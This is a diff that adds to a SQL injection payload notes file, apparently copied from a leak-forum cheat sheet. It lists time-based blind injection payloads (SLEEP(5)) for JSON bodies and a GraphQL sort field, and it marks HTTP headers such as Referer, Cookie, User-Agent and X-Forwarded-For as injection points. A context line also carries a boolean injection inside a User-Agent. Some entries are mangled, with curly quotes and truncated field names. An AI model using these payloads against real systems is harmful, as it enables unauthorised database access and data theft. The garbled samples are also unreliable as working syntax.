@@ -41,4 +41,43 @@ User-Agent
 font:https://hackerone.com/reports/2599826
 Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG
 
-https://leakbase.la/threads/blind-sql-injection-detection-and-exploitation-cheat-sheet.7223/
+==========================================================================================================================================
+FONTE: https://leakbase.la/threads/blind-sql-injection-detection-and-exploitation-cheat-sheet.7223/
+
+4.Blind Sql injection in json:
+
+{payload}
+
+[payload]
+
+{value payload}
+
+Example:
+
+[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]{AnD SLEEP(5)}{1 AnD SLEEP(5)}{1' AnD SLEEP(5)--}{sleep 5}"emails":["AnD SLEEP(5)"]"emails":["test@gmail.com' OR SLEEP(5)#"]{"options":{"id":[],"emails":["AnD SLEEP(5)"],
+
+5.Blind Sql injection in Graphql:
+
+{“operationName”:”pages”,”variables”:{“offset”:0,”limit”:10,”sortc”:”name Payload”,”sortrev”:false},”query”:”query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n __typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n”}
+
+Example:
+
+{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name AND sleep(5)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n __typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n"}
+
+6.Http header based (Error based,Time Based):
+
+Referer: https://https://redact.com/408685756payload
+
+Cookie: _gcl_au=1.1.2127391584.1587087463payload
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87Payload
+
+or
+
+Referer: https://https://redact.com/408685756 payload
+
+Cookie: _gcl_au=1.1.2127391584.1587087463 payload
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Payload
+
+X-Forwarded-For: payload
